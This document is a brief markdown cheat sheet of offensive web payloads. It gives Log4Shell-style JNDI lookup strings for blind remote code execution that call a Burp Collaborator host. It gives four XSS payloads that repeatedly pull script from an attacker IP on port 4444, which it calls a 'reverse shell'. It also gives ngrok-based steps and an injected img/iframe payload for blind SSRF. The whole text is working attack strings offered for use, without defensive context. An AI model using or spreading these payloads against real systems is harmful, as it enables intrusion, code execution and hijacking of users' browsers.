## Blind RCE:
```
${jndi:ldap://${command}XXXX${::-.}burpcollab}zzzz

${jndi:ldap://${command}XXXX${::-.}.burpcollaborator}zzzz
```
## XSS to Reverse shell:
```
<svg/onlaod=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}},1010)>

<script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}},1010)</script>

<img src=link onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}},1010)>

<body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}}></body>
```
## Blind SSRF:
```
1. Run ngrok: ./ngrok http 80
2. Open with Browser: 127.0.01:4040/inspect/http
3. Inject the payload in below:
"><img src="xasdasdasd" onerror="document.write('<iframe src=https://d0.ngrok.io></iframe>')"
```
